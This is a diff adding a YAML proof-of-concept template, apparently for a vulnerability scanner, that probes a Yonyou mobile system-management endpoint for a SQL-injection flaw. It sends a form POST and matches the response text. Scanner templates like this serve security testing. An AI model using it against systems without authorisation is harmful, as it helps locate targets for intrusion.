@@ -1,0 +1,12 @@
+name: poc-yaml-用友-移动系统管理-sql
+description: "sql注入"
+method: POST
+body: "appname=1&sys_type=&loginmode=&joinmode="
+headers:
+  Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+path:
+  - /maportal/appmanager/init
+expression:
+  status: 200
+  body_all:
+    - "productlist"
